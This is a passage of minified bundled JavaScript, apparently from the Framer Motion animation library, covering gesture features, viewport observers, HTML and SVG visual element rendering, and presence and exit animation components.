    return this.removeEndListeners(), this.isPressing = !1, this.node.getProps().whileTap && this.node.animationState && this.node.animationState.setActive("whileTap", !1), !N1()
  }
  cancelPress(t, n) {
    if (!this.checkPressEnd()) return;
    const {
      onTapCancel: r
    } = this.node.getProps();
    r && ue.postRender(() => r(t, n))
  }
  mount() {
    const t = this.node.getProps(),
      n = ur(t.globalTapTarget ? window : this.node.current, "pointerdown", this.startPointerPress, {
        passive: !(t.onTapStart || t.onPointerStart)
      }),
      r = Cn(this.node.current, "focus", this.startAccessiblePress);
    this.removeStartListeners = cr(n, r)
  }
  unmount() {
    this.removeStartListeners(), this.removeEndListeners(), this.removeAccessibleListeners()
  }
}
const jd = new WeakMap,
  su = new WeakMap,
  PP = e => {
    const t = jd.get(e.target);
    t && t(e)
  },
  EP = e => {
    e.forEach(PP)
  };

function TP({
  root: e,
  ...t
}) {
  const n = e || document;
  su.has(n) || su.set(n, {});
  const r = su.get(n),
    s = JSON.stringify(t);
  return r[s] || (r[s] = new IntersectionObserver(EP, {
    root: e,
    ...t
  })), r[s]
}

function kP(e, t, n) {
  const r = TP(t);
  return jd.set(e, n), r.observe(e), () => {
    jd.delete(e), r.unobserve(e)
  }
}
const RP = {
  some: 0,
  all: 1
};
class DP extends xr {
  constructor() {
    super(...arguments), this.hasEnteredView = !1, this.isInView = !1
  }
  startObserver() {
    this.unmount();
    const {
      viewport: t = {}
    } = this.node.getProps(), {
      root: n,
      margin: r,
      amount: s = "some",
      once: o
    } = t, i = {
      root: n ? n.current : void 0,
      rootMargin: r,
      threshold: typeof s == "number" ? s : RP[s]
    }, a = c => {
      const {
        isIntersecting: u
      } = c;
      if (this.isInView === u || (this.isInView = u, o && !u && this.hasEnteredView)) return;
      u && (this.hasEnteredView = !0), this.node.animationState && this.node.animationState.setActive("whileInView", u);
      const {
        onViewportEnter: d,
        onViewportLeave: f
      } = this.node.getProps(), h = u ? d : f;
      h && h(c)
    };
    return kP(this.node.current, i, a)
  }
  mount() {
    this.startObserver()
  }
  update() {
    if (typeof IntersectionObserver > "u") return;
    const {
      props: t,
      prevProps: n
    } = this.node;
    ["amount", "margin", "root"].some(MP(t, n)) && this.startObserver()
  }
  unmount() { }
}

function MP({
  viewport: e = {}
}, {
  viewport: t = {}
} = {}) {
  return n => e[n] !== t[n]
}
const _P = {
  inView: {
    Feature: DP
  },
  tap: {
    Feature: AP
  },
  focus: {
    Feature: jP
  },
  hover: {
    Feature: NP
  }
},
  IP = {
    layout: {
      ProjectionNode: H1,
      MeasureLayout: L1
    }
  },
  uh = x.createContext({
    transformPagePoint: e => e,
    isStatic: !1,
    reducedMotion: "never"
  }),
  Gl = x.createContext({}),
  dh = typeof window < "u",
  K1 = dh ? x.useLayoutEffect : x.useEffect,
  Q1 = x.createContext({
    strict: !1
  });

function LP(e, t, n, r, s) {
  var o, i;
  const {
    visualElement: a
  } = x.useContext(Gl), c = x.useContext(Q1), u = x.useContext(Ql), d = x.useContext(uh).reducedMotion, f = x.useRef();
  r = r || c.renderer, !f.current && r && (f.current = r(e, {
    visualState: t,
    parent: a,
    props: n,
    presenceContext: u,
    blockInitialAnimation: u ? u.initial === !1 : !1,
    reducedMotionConfig: d
  }));
  const h = f.current,
    y = x.useContext(I1);
  h && !h.projection && s && (h.type === "html" || h.type === "svg") && OP(f.current, n, s, y);
  const w = x.useRef(!1);
  x.useInsertionEffect(() => {
    h && w.current && h.update(n, u)
  });
  const v = n[w1],
    S = x.useRef(!!v && !(!((o = window.MotionHandoffIsComplete) === null || o === void 0) && o.call(window, v)) && ((i = window.MotionHasOptimisedAnimation) === null || i === void 0 ? void 0 : i.call(window, v)));
  return K1(() => {
    h && (w.current = !0, window.MotionIsMounted = !0, h.updateFeatures(), ch.render(h.render), S.current && h.animationState && h.animationState.animateChanges())
  }), x.useEffect(() => {
    h && (!S.current && h.animationState && h.animationState.animateChanges(), S.current && (queueMicrotask(() => {
      var g;
      (g = window.MotionHandoffMarkAsComplete) === null || g === void 0 || g.call(window, v)
    }), S.current = !1))
  }), h
}

function OP(e, t, n, r) {
  const {
    layoutId: s,
    layout: o,
    drag: i,
    dragConstraints: a,
    layoutScroll: c,
    layoutRoot: u
  } = t;
  e.projection = new n(e.latestValues, t["data-framer-portal-id"] ? void 0 : G1(e.parent)), e.projection.setOptions({
    layoutId: s,
    layout: o,
    alwaysMeasureLayout: !!i || a && ms(a),
    visualElement: e,
    animationType: typeof o == "string" ? o : "both",
    initialPromotionConfig: r,
    layoutScroll: c,
    layoutRoot: u
  })
}

function G1(e) {
  if (e) return e.options.allowProjection !== !1 ? e.projection : G1(e.parent)
}

function FP(e, t, n) {
  return x.useCallback(r => {
    r && e.mount && e.mount(r), t && (r ? t.mount(r) : t.unmount()), n && (typeof n == "function" ? n(r) : ms(n) && (n.current = r))
  }, [t])
}

function ql(e) {
  return Hl(e.animate) || Uf.some(t => fi(e[t]))
}

function q1(e) {
  return !!(ql(e) || e.variants)
}

function VP(e, t) {
  if (ql(e)) {
    const {
      initial: n,
      animate: r
    } = e;
    return {
      initial: n === !1 || fi(n) ? n : void 0,
      animate: fi(r) ? r : void 0
    }
  }
  return e.inherit !== !1 ? t : {}
}

function BP(e) {
  const {
    initial: t,
    animate: n
  } = VP(e, x.useContext(Gl));
  return x.useMemo(() => ({
    initial: t,
    animate: n
  }), [Cg(t), Cg(n)])
}

function Cg(e) {
  return Array.isArray(e) ? e.join(" ") : e
}
const Ng = {
  animation: ["animate", "variants", "whileHover", "whileTap", "exit", "whileInView", "whileFocus", "whileDrag"],
  exit: ["exit"],
  drag: ["drag", "dragControls"],
  focus: ["whileFocus"],
  hover: ["whileHover", "onHoverStart", "onHoverEnd"],
  tap: ["whileTap", "onTap", "onTapStart", "onTapCancel"],
  pan: ["onPan", "onPanStart", "onPanSessionStart", "onPanEnd"],
  inView: ["whileInView", "onViewportEnter", "onViewportLeave"],
  layout: ["layout", "layoutId"]
},
  Gs = {};
for (const e in Ng) Gs[e] = {
  isEnabled: t => Ng[e].some(n => !!t[n])
};

function zP(e) {
  for (const t in e) Gs[t] = {
    ...Gs[t],
    ...e[t]
  }
}
const UP = Symbol.for("motionComponentSymbol");

function $P({
  preloadedFeatures: e,
  createVisualElement: t,
  useRender: n,
  useVisualState: r,
  Component: s
}) {
  e && zP(e);

  function o(a, c) {
    let u;
    const d = {
      ...x.useContext(uh),
      ...a,
      layoutId: HP(a)
    },
      {
        isStatic: f
      } = d,
      h = BP(a),
      y = r(a, f);
    if (!f && dh) {
      WP();
      const w = KP(d);
      u = w.MeasureLayout, h.visualElement = LP(s, y, d, t, w.ProjectionNode)
    }
    return l.jsxs(Gl.Provider, {
      value: h,
      children: [u && h.visualElement ? l.jsx(u, {
        visualElement: h.visualElement,
        ...d
      }) : null, n(s, a, FP(y, h.visualElement, c), y, f, h.visualElement)]
    })
  }
  const i = x.forwardRef(o);
  return i[UP] = s, i
}

function HP({
  layoutId: e
}) {
  const t = x.useContext(lh).id;
  return t && e !== void 0 ? t + "-" + e : e
}

function WP(e, t) {
  x.useContext(Q1).strict
}

function KP(e) {
  const {
    drag: t,
    layout: n
  } = Gs;
  if (!t && !n) return {};
  const r = {
    ...t,
    ...n
  };
  return {
    MeasureLayout: t != null && t.isEnabled(e) || n != null && n.isEnabled(e) ? r.MeasureLayout : void 0,
    ProjectionNode: r.ProjectionNode
  }
}
const QP = ["animate", "circle", "defs", "desc", "ellipse", "g", "image", "line", "filter", "marker", "mask", "metadata", "path", "pattern", "polygon", "polyline", "rect", "stop", "switch", "symbol", "svg", "text", "tspan", "use", "view"];

function fh(e) {
  return typeof e != "string" || e.includes("-") ? !1 : !!(QP.indexOf(e) > -1 || /[A-Z]/u.test(e))
}

function Y1(e, {
  style: t,
  vars: n
}, r, s) {
  Object.assign(e.style, t, s && s.getProjectionStyles(r));
  for (const o in n) e.style.setProperty(o, n[o])
}
const X1 = new Set(["baseFrequency", "diffuseConstant", "kernelMatrix", "kernelUnitLength", "keySplines", "keyTimes", "limitingConeAngle", "markerHeight", "markerWidth", "numOctaves", "targetX", "targetY", "surfaceScale", "specularConstant", "specularExponent", "stdDeviation", "tableValues", "viewBox", "gradientTransform", "pathLength", "startOffset", "textLength", "lengthAdjust"]);

function J1(e, t, n, r) {
  Y1(e, t, void 0, r);
  for (const s in t.attrs) e.setAttribute(X1.has(s) ? s : ah(s), t.attrs[s])
}

function Z1(e, {
  layout: t,
  layoutId: n
}) {
  return Qr.has(e) || e.startsWith("origin") || (t || n !== void 0) && (!!fl[e] || e === "opacity")
}

function hh(e, t, n) {
  var r;
  const {
    style: s
  } = e, o = {};
  for (const i in s) (qe(s[i]) || t.style && qe(t.style[i]) || Z1(i, e) || ((r = n == null ? void 0 : n.getValue(i)) === null || r === void 0 ? void 0 : r.liveStyle) !== void 0) && (o[i] = s[i]);
  return o
}

function ew(e, t, n) {
  const r = hh(e, t, n);
  for (const s in e)
    if (qe(e[s]) || qe(t[s])) {
      const o = Ai.indexOf(s) !== -1 ? "attr" + s.charAt(0).toUpperCase() + s.substring(1) : s;
      r[o] = e[s]
    } return r
}

function mh(e) {
  const t = x.useRef(null);
  return t.current === null && (t.current = e()), t.current
}

function GP({
  scrapeMotionValuesFromProps: e,
  createRenderState: t,
  onMount: n
}, r, s, o) {
  const i = {
    latestValues: qP(r, s, o, e),
    renderState: t()
  };
  return n && (i.mount = a => n(r, a, i)), i
}
const tw = e => (t, n) => {
  const r = x.useContext(Gl),
    s = x.useContext(Ql),
    o = () => GP(e, t, r, s);
  return n ? o() : mh(o)
};

function qP(e, t, n, r) {
  const s = {},
    o = r(e, {});
  for (const h in o) s[h] = Ta(o[h]);
  let {
    initial: i,
    animate: a
  } = e;
  const c = ql(e),
    u = q1(e);
  t && u && !c && e.inherit !== !1 && (i === void 0 && (i = t.initial), a === void 0 && (a = t.animate));
  let d = n ? n.initial === !1 : !1;
  d = d || i === !1;
  const f = d ? a : i;
  if (f && typeof f != "boolean" && !Hl(f)) {
    const h = Array.isArray(f) ? f : [f];
    for (let y = 0; y < h.length; y++) {
      const w = Bf(e, h[y]);
      if (w) {
        const {
          transitionEnd: v,
          transition: S,
          ...g
        } = w;
        for (const p in g) {
          let m = g[p];
          if (Array.isArray(m)) {
            const b = d ? m.length - 1 : 0;
            m = m[b]
          }
          m !== null && (s[p] = m)
        }
        for (const p in v) s[p] = v[p]
      }
    }
  }
  return s
}
const ph = () => ({
  style: {},
  transform: {},
  transformOrigin: {},
  vars: {}
}),
  nw = () => ({
    ...ph(),
    attrs: {}
  }),
  rw = (e, t) => t && typeof e == "number" ? t.transform(e) : e,
  YP = {
    x: "translateX",
    y: "translateY",
    z: "translateZ",
    transformPerspective: "perspective"
  },
  XP = Ai.length;

function JP(e, t, n) {
  let r = "",
    s = !0;
  for (let o = 0; o < XP; o++) {
    const i = Ai[o],
      a = e[i];
    if (a === void 0) continue;
    let c = !0;
    if (typeof a == "number" ? c = a === (i.startsWith("scale") ? 1 : 0) : c = parseFloat(a) === 0, !c || n) {
      const u = rw(a, Yf[i]);
      if (!c) {
        s = !1;
        const d = YP[i] || i;
        r += `${d}(${u}) `
      }
      n && (t[i] = u)
    }
  }
  return r = r.trim(), n ? r = n(t, s ? "" : r) : s && (r = "none"), r
}

function gh(e, t, n) {
  const {
    style: r,
    vars: s,
    transformOrigin: o
  } = e;
  let i = !1,
    a = !1;
  for (const c in t) {
    const u = t[c];
    if (Qr.has(c)) {
      i = !0;
      continue
    } else if (qx(c)) {
      s[c] = u;
      continue
    } else {
      const d = rw(u, Yf[c]);
      c.startsWith("origin") ? (a = !0, o[c] = d) : r[c] = d
    }
  }
  if (t.transform || (i || n ? r.transform = JP(t, e.transform, n) : r.transform && (r.transform = "none")), a) {
    const {
      originX: c = "50%",
      originY: u = "50%",
      originZ: d = 0
    } = o;
    r.transformOrigin = `${c} ${u} ${d}`
  }
}

function jg(e, t, n) {
  return typeof e == "string" ? e : q.transform(t + n * e)
}

function ZP(e, t, n) {
  const r = jg(t, e.x, e.width),
    s = jg(n, e.y, e.height);
  return `${r} ${s}`
}
const eE = {
  offset: "stroke-dashoffset",
  array: "stroke-dasharray"
},
  tE = {
    offset: "strokeDashoffset",
    array: "strokeDasharray"
  };

function nE(e, t, n = 1, r = 0, s = !0) {
  e.pathLength = 1;
  const o = s ? eE : tE;
  e[o.offset] = q.transform(-r);
  const i = q.transform(t),
    a = q.transform(n);
  e[o.array] = `${i} ${a}`
}

function yh(e, {
  attrX: t,
  attrY: n,
  attrScale: r,
  originX: s,
  originY: o,
  pathLength: i,
  pathSpacing: a = 1,
  pathOffset: c = 0,
  ...u
}, d, f) {
  if (gh(e, u, f), d) {
    e.style.viewBox && (e.attrs.viewBox = e.style.viewBox);
    return
  }
  e.attrs = e.style, e.style = {};
  const {
    attrs: h,
    style: y,
    dimensions: w
  } = e;
  h.transform && (w && (y.transform = h.transform), delete h.transform), w && (s !== void 0 || o !== void 0 || y.transform) && (y.transformOrigin = ZP(w, s !== void 0 ? s : .5, o !== void 0 ? o : .5)), t !== void 0 && (h.x = t), n !== void 0 && (h.y = n), r !== void 0 && (h.scale = r), i !== void 0 && nE(h, i, a, c, !1)
}
const vh = e => typeof e == "string" && e.toLowerCase() === "svg",
  rE = {
    useVisualState: tw({
      scrapeMotionValuesFromProps: ew,
      createRenderState: nw,
      onMount: (e, t, {
        renderState: n,
        latestValues: r
      }) => {
        ue.read(() => {
          try {
            n.dimensions = typeof t.getBBox == "function" ? t.getBBox() : t.getBoundingClientRect()
          } catch {
            n.dimensions = {
              x: 0,
              y: 0,
              width: 0,
              height: 0
            }
          }
        }), ue.render(() => {
          yh(n, r, vh(t.tagName), e.transformTemplate), J1(t, n)
        })
      }
    })
  },
  sE = {
    useVisualState: tw({
      scrapeMotionValuesFromProps: hh,
      createRenderState: ph
    })
  };

function sw(e, t, n) {
  for (const r in t) !qe(t[r]) && !Z1(r, n) && (e[r] = t[r])
}

function oE({
  transformTemplate: e
}, t) {
  return x.useMemo(() => {
    const n = ph();
    return gh(n, t, e), Object.assign({}, n.vars, n.style)
  }, [t])
}

function iE(e, t) {
  const n = e.style || {},
    r = {};
  return sw(r, n, e), Object.assign(r, oE(e, t)), r
}

function aE(e, t) {
  const n = {},
    r = iE(e, t);
  return e.drag && e.dragListener !== !1 && (n.draggable = !1, r.userSelect = r.WebkitUserSelect = r.WebkitTouchCallout = "none", r.touchAction = e.drag === !0 ? "none" : `pan-${e.drag === "x" ? "y" : "x"}`), e.tabIndex === void 0 && (e.onTap || e.onTapStart || e.whileTap) && (n.tabIndex = 0), n.style = r, n
}
const lE = new Set(["animate", "exit", "variants", "initial", "style", "values", "variants", "transition", "transformTemplate", "custom", "inherit", "onBeforeLayoutMeasure", "onAnimationStart", "onAnimationComplete", "onUpdate", "onDragStart", "onDrag", "onDragEnd", "onMeasureDragConstraints", "onDirectionLock", "onDragTransitionEnd", "_dragX", "_dragY", "onHoverStart", "onHoverEnd", "onViewportEnter", "onViewportLeave", "globalTapTarget", "ignoreStrict", "viewport"]);

function hl(e) {
  return e.startsWith("while") || e.startsWith("drag") && e !== "draggable" || e.startsWith("layout") || e.startsWith("onTap") || e.startsWith("onPan") || e.startsWith("onLayout") || lE.has(e)
}
let ow = e => !hl(e);

function cE(e) {
  e && (ow = t => t.startsWith("on") ? !hl(t) : e(t))
}
try {
  cE(require("@emotion/is-prop-valid").default)
} catch { }

function uE(e, t, n) {
  const r = {};
  for (const s in e) s === "values" && typeof e.values == "object" || (ow(s) || n === !0 && hl(s) || !t && !hl(s) || e.draggable && s.startsWith("onDrag")) && (r[s] = e[s]);
  return r
}

function dE(e, t, n, r) {
  const s = x.useMemo(() => {
    const o = nw();
    return yh(o, t, vh(r), e.transformTemplate), {
      ...o.attrs,
      style: {
        ...o.style
      }
    }
  }, [t]);
  if (e.style) {
    const o = {};
    sw(o, e.style, e), s.style = {
      ...o,
      ...s.style
    }
  }
  return s
}

function fE(e = !1) {
  return (n, r, s, {
    latestValues: o
  }, i) => {
    const c = (fh(n) ? dE : aE)(r, o, i, n),
      u = uE(r, typeof n == "string", e),
      d = n !== x.Fragment ? {
        ...u,
        ...c,
        ref: s
      } : {},
      {
        children: f
      } = r,
      h = x.useMemo(() => qe(f) ? f.get() : f, [f]);
    return x.createElement(n, {
      ...d,
      children: h
    })
  }
}

function hE(e, t) {
  return function (r, {
    forwardMotionProps: s
  } = {
      forwardMotionProps: !1
    }) {
    const i = {
      ...fh(r) ? rE : sE,
      preloadedFeatures: e,
      useRender: fE(s),
      createVisualElement: t,
      Component: r
    };
    return $P(i)
  }
}
const Ad = {
  current: null
},
  iw = {
    current: !1
  };

function mE() {
  if (iw.current = !0, !!dh)
    if (window.matchMedia) {
      const e = window.matchMedia("(prefers-reduced-motion)"),
        t = () => Ad.current = e.matches;
      e.addListener(t), t()
    } else Ad.current = !1
}

function pE(e, t, n) {
  for (const r in t) {
    const s = t[r],
      o = n[r];
    if (qe(s)) e.addValue(r, s);
    else if (qe(o)) e.addValue(r, pi(s, {
      owner: e
    }));
    else if (o !== s)
      if (e.hasValue(r)) {
        const i = e.getValue(r);
        i.liveStyle === !0 ? i.jump(s) : i.hasAnimated || i.set(s)
      } else {
        const i = e.getStaticValue(r);
        e.addValue(r, pi(i !== void 0 ? i : s, {
          owner: e
        }))
      }
  }
  for (const r in n) t[r] === void 0 && e.removeValue(r);
  return t
}
const Ag = new WeakMap,
  gE = [...Jx, Qe, mr],
  yE = e => gE.find(Xx(e)),
  Pg = ["AnimationStart", "AnimationComplete", "Update", "BeforeLayoutMeasure", "LayoutMeasure", "LayoutAnimationStart", "LayoutAnimationComplete"];
class vE {
  scrapeMotionValuesFromProps(t, n, r) {
    return {}
  }
  constructor({
    parent: t,
    props: n,
    presenceContext: r,
    reducedMotionConfig: s,
    blockInitialAnimation: o,
    visualState: i
  }, a = {}) {
    this.current = null, this.children = new Set, this.isVariantNode = !1, this.isControllingVariants = !1, this.shouldReduceMotion = null, this.values = new Map, this.KeyframeResolver = Qf, this.features = {}, this.valueSubscriptions = new Map, this.prevMotionValues = {}, this.events = {}, this.propEventSubscriptions = {}, this.notifyUpdate = () => this.notify("Update", this.latestValues), this.render = () => {
      this.current && (this.triggerBuild(), this.renderInstance(this.current, this.renderState, this.props.style, this.projection))
    }, this.renderScheduledAt = 0, this.scheduleRender = () => {
      const h = ln.now();
      this.renderScheduledAt < h && (this.renderScheduledAt = h, ue.render(this.render, !1, !0))
    };
    const {
      latestValues: c,
      renderState: u
    } = i;
    this.latestValues = c, this.baseTarget = {
      ...c
    }, this.initialValues = n.initial ? {
      ...c
    } : {}, this.renderState = u, this.parent = t, this.props = n, this.presenceContext = r, this.depth = t ? t.depth + 1 : 0, this.reducedMotionConfig = s, this.options = a, this.blockInitialAnimation = !!o, this.isControllingVariants = ql(n), this.isVariantNode = q1(n), this.isVariantNode && (this.variantChildren = new Set), this.manuallyAnimateOnMount = !!(t && t.current);
    const {
      willChange: d,
      ...f
    } = this.scrapeMotionValuesFromProps(n, {}, this);
    for (const h in f) {
      const y = f[h];
      c[h] !== void 0 && qe(y) && y.set(c[h], !1)
    }
  }
  mount(t) {
    this.current = t, Ag.set(t, this), this.projection && !this.projection.instance && this.projection.mount(t), this.parent && this.isVariantNode && !this.isControllingVariants && (this.removeFromVariantTree = this.parent.addVariantChild(this)), this.values.forEach((n, r) => this.bindToMotionValue(r, n)), iw.current || mE(), this.shouldReduceMotion = this.reducedMotionConfig === "never" ? !1 : this.reducedMotionConfig === "always" ? !0 : Ad.current, this.parent && this.parent.children.add(this), this.update(this.props, this.presenceContext)
  }
  unmount() {
    Ag.delete(this.current), this.projection && this.projection.unmount(), hr(this.notifyUpdate), hr(this.render), this.valueSubscriptions.forEach(t => t()), this.valueSubscriptions.clear(), this.removeFromVariantTree && this.removeFromVariantTree(), this.parent && this.parent.children.delete(this);
    for (const t in this.events) this.events[t].clear();
    for (const t in this.features) {
      const n = this.features[t];
      n && (n.unmount(), n.isMounted = !1)
    }
    this.current = null
  }
  bindToMotionValue(t, n) {
    this.valueSubscriptions.has(t) && this.valueSubscriptions.get(t)();
    const r = Qr.has(t),
      s = n.on("change", a => {
        this.latestValues[t] = a, this.props.onUpdate && ue.preRender(this.notifyUpdate), r && this.projection && (this.projection.isTransformDirty = !0)
      }),
      o = n.on("renderRequest", this.scheduleRender);
    let i;
    window.MotionCheckAppearSync && (i = window.MotionCheckAppearSync(this, t, n)), this.valueSubscriptions.set(t, () => {
      s(), o(), i && i(), n.owner && n.stop()
    })
  }
  sortNodePosition(t) {
    return !this.current || !this.sortInstanceNodePosition || this.type !== t.type ? 0 : this.sortInstanceNodePosition(this.current, t.current)
  }
  updateFeatures() {
    let t = "animation";
    for (t in Gs) {
      const n = Gs[t];
      if (!n) continue;
      const {
        isEnabled: r,
        Feature: s
      } = n;
      if (!this.features[t] && s && r(this.props) && (this.features[t] = new s(this)), this.features[t]) {
        const o = this.features[t];
        o.isMounted ? o.update() : (o.mount(), o.isMounted = !0)
      }
    }
  }
  triggerBuild() {
    this.build(this.renderState, this.latestValues, this.props)
  }
  measureViewportBox() {
    return this.current ? this.measureInstanceViewportBox(this.current, this.props) : je()
  }
  getStaticValue(t) {
    return this.latestValues[t]
  }
  setStaticValue(t, n) {
    this.latestValues[t] = n
  }
  update(t, n) {
    (t.transformTemplate || this.props.transformTemplate) && this.scheduleRender(), this.prevProps = this.props, this.props = t, this.prevPresenceContext = this.presenceContext, this.presenceContext = n;
    for (let r = 0; r < Pg.length; r++) {
      const s = Pg[r];
      this.propEventSubscriptions[s] && (this.propEventSubscriptions[s](), delete this.propEventSubscriptions[s]);
      const o = "on" + s,
        i = t[o];
      i && (this.propEventSubscriptions[s] = this.on(s, i))
    }
    this.prevMotionValues = pE(this, this.scrapeMotionValuesFromProps(t, this.prevProps, this), this.prevMotionValues), this.handleChildMotionValue && this.handleChildMotionValue()
  }
  getProps() {
    return this.props
  }
  getVariant(t) {
    return this.props.variants ? this.props.variants[t] : void 0
  }
  getDefaultTransition() {
    return this.props.transition
  }
  getTransformPagePoint() {
    return this.props.transformPagePoint
  }
  getClosestVariantNode() {
    return this.isVariantNode ? this : this.parent ? this.parent.getClosestVariantNode() : void 0
  }
  addVariantChild(t) {
    const n = this.getClosestVariantNode();
    if (n) return n.variantChildren && n.variantChildren.add(t), () => n.variantChildren.delete(t)
  }
  addValue(t, n) {
    const r = this.values.get(t);
    n !== r && (r && this.removeValue(t), this.bindToMotionValue(t, n), this.values.set(t, n), this.latestValues[t] = n.get())
  }
  removeValue(t) {
    this.values.delete(t);
    const n = this.valueSubscriptions.get(t);
    n && (n(), this.valueSubscriptions.delete(t)), delete this.latestValues[t], this.removeValueFromRenderState(t, this.renderState)
  }
  hasValue(t) {
    return this.values.has(t)
  }
  getValue(t, n) {
    if (this.props.values && this.props.values[t]) return this.props.values[t];
    let r = this.values.get(t);
    return r === void 0 && n !== void 0 && (r = pi(n === null ? void 0 : n, {
      owner: this
    }), this.addValue(t, r)), r
  }
  readValue(t, n) {
    var r;
    let s = this.latestValues[t] !== void 0 || !this.current ? this.latestValues[t] : (r = this.getBaseTargetFromProps(this.props, t)) !== null && r !== void 0 ? r : this.readValueFromInstance(this.current, t, this.options);
    return s != null && (typeof s == "string" && (Qx(s) || Kx(s)) ? s = parseFloat(s) : !yE(s) && mr.test(n) && (s = i1(t, n)), this.setBaseTarget(t, qe(s) ? s.get() : s)), qe(s) ? s.get() : s
  }
  setBaseTarget(t, n) {
    this.baseTarget[t] = n
  }
  getBaseTarget(t) {
    var n;
    const {
      initial: r
    } = this.props;
    let s;
    if (typeof r == "string" || typeof r == "object") {
      const i = Bf(this.props, r, (n = this.presenceContext) === null || n === void 0 ? void 0 : n.custom);
      i && (s = i[t])
    }
    if (r && s !== void 0) return s;
    const o = this.getBaseTargetFromProps(this.props, t);
    return o !== void 0 && !qe(o) ? o : this.initialValues[t] !== void 0 && s === void 0 ? void 0 : this.baseTarget[t]
  }
  on(t, n) {
    return this.events[t] || (this.events[t] = new ih), this.events[t].add(n)
  }
  notify(t, ...n) {
    this.events[t] && this.events[t].notify(...n)
  }
}
class aw extends vE {
  constructor() {
    super(...arguments), this.KeyframeResolver = a1
  }
  sortInstanceNodePosition(t, n) {
    return t.compareDocumentPosition(n) & 2 ? 1 : -1
  }
  getBaseTargetFromProps(t, n) {
    return t.style ? t.style[n] : void 0
  }
  removeValueFromRenderState(t, {
    vars: n,
    style: r
  }) {
    delete n[t], delete r[t]
  }
  handleChildMotionValue() {
    this.childSubscription && (this.childSubscription(), delete this.childSubscription);
    const {
      children: t
    } = this.props;
    qe(t) && (this.childSubscription = t.on("change", n => {
      this.current && (this.current.textContent = `${n}`)
    }))
  }
}

function xE(e) {
  return window.getComputedStyle(e)
}
class wE extends aw {
  constructor() {
    super(...arguments), this.type = "html", this.renderInstance = Y1
  }
  readValueFromInstance(t, n) {
    if (Qr.has(n)) {
      const r = Xf(n);
      return r && r.default || 0
    } else {
      const r = xE(t),
        s = (qx(n) ? r.getPropertyValue(n) : r[n]) || 0;
      return typeof s == "string" ? s.trim() : s
    }
  }
  measureInstanceViewportBox(t, {
    transformPagePoint: n
  }) {
    return M1(t, n)
  }
  build(t, n, r) {
    gh(t, n, r.transformTemplate)
  }
  scrapeMotionValuesFromProps(t, n, r) {
    return hh(t, n, r)
  }
}
class bE extends aw {
  constructor() {
    super(...arguments), this.type = "svg", this.isSVGTag = !1, this.measureInstanceViewportBox = je
  }
  getBaseTargetFromProps(t, n) {
    return t[n]
  }
  readValueFromInstance(t, n) {
    if (Qr.has(n)) {
      const r = Xf(n);
      return r && r.default || 0
    }
    return n = X1.has(n) ? n : ah(n), t.getAttribute(n)
  }
  scrapeMotionValuesFromProps(t, n, r) {
    return ew(t, n, r)
  }
  build(t, n, r) {
    yh(t, n, this.isSVGTag, r.transformTemplate)
  }
  renderInstance(t, n, r, s) {
    J1(t, n, r, s)
  }
  mount(t) {
    this.isSVGTag = vh(t.tagName), super.mount(t)
  }
}
const SE = (e, t) => fh(e) ? new bE(t) : new wE(t, {
  allowProjection: e !== x.Fragment
}),
  CE = hE({
    ...c4,
    ..._P,
    ...CP,
    ...IP
  }, SE),
  ou = aj(CE);
class NE extends x.Component {
  getSnapshotBeforeUpdate(t) {
    const n = this.props.childRef.current;
    if (n && t.isPresent && !this.props.isPresent) {
      const r = this.props.sizeRef.current;
      r.height = n.offsetHeight || 0, r.width = n.offsetWidth || 0, r.top = n.offsetTop, r.left = n.offsetLeft
    }
    return null
  }
  componentDidUpdate() { }
  render() {
    return this.props.children
  }
}

function jE({
  children: e,
  isPresent: t
}) {
  const n = x.useId(),
    r = x.useRef(null),
    s = x.useRef({
      width: 0,
      height: 0,
      top: 0,
      left: 0
    }),
    {
      nonce: o
    } = x.useContext(uh);
  return x.useInsertionEffect(() => {
    const {
      width: i,
      height: a,
      top: c,
      left: u
    } = s.current;
    if (t || !r.current || !i || !a) return;
    r.current.dataset.motionPopId = n;
    const d = document.createElement("style");
    return o && (d.nonce = o), document.head.appendChild(d), d.sheet && d.sheet.insertRule(`
          [data-motion-pop-id="${n}"] {
            position: absolute !important;
            width: ${i}px !important;
            height: ${a}px !important;
            top: ${c}px !important;
            left: ${u}px !important;
          }
        `), () => {
        document.head.removeChild(d)
      }
  }, [t]), l.jsx(NE, {
    isPresent: t,
    childRef: r,
    sizeRef: s,
    children: x.cloneElement(e, {
      ref: r
    })
  })
}
const AE = ({
  children: e,
  initial: t,
  isPresent: n,
  onExitComplete: r,
  custom: s,
  presenceAffectsLayout: o,
  mode: i
}) => {
  const a = mh(PE),
    c = x.useId(),
    u = x.useCallback(f => {
      a.set(f, !0);
      for (const h of a.values())
        if (!h) return;
      r && r()
    }, [a, r]),
    d = x.useMemo(() => ({
      id: c,
      initial: t,
      isPresent: n,
      custom: s,
      onExitComplete: u,
      register: f => (a.set(f, !1), () => a.delete(f))
    }), o ? [Math.random(), u] : [n, u]);
  return x.useMemo(() => {
    a.forEach((f, h) => a.set(h, !1))
  }, [n]), x.useEffect(() => {
    !n && !a.size && r && r()
  }, [n]), i === "popLayout" && (e = l.jsx(jE, {
    isPresent: n,
    children: e
  })), l.jsx(Ql.Provider, {
    value: d,
    children: e
  })
};

function PE() {
  return new Map
}
const ua = e => e.key || "";

function Eg(e) {
  const t = [];
  return x.Children.forEach(e, n => {
    x.isValidElement(n) && t.push(n)
  }), t
}
const Tg = ({
  children: e,
  exitBeforeEnter: t,
  custom: n,
  initial: r = !0,
  onExitComplete: s,
  presenceAffectsLayout: o = !0,
  mode: i = "sync"
}) => {
  const a = x.useMemo(() => Eg(e), [e]),
    c = a.map(ua),
    u = x.useRef(!0),
    d = x.useRef(a),
    f = mh(() => new Map),
    [h, y] = x.useState(a),
    [w, v] = x.useState(a);
  K1(() => {
    u.current = !1, d.current = a;
    for (let p = 0; p < w.length; p++) {
      const m = ua(w[p]);
      c.includes(m) ? f.delete(m) : f.get(m) !== !0 && f.set(m, !1)
    }
  }, [w, c.length, c.join("-")]);
  const S = [];
  if (a !== h) {
    let p = [...a];
    for (let m = 0; m < w.length; m++) {
      const b = w[m],
        C = ua(b);
      c.includes(C) || (p.splice(m, 0, b), S.push(b))
    }
    i === "wait" && S.length && (p = S), v(Eg(p)), y(a);
    return
  }
  const {
    forceRender: g
  } = x.useContext(lh);
  return l.jsx(l.Fragment, {
    children: w.map(p => {
      const m = ua(p),
        b = a === w || c.includes(m),
        C = () => {
          if (f.has(m)) f.set(m, !0);
          else return;
          let j = !0;
          f.forEach(A => {
            A || (j = !1)
          }), j && (g == null || g(), v(d.current), s && s())
        };
      return l.jsx(AE, {
        isPresent: b,
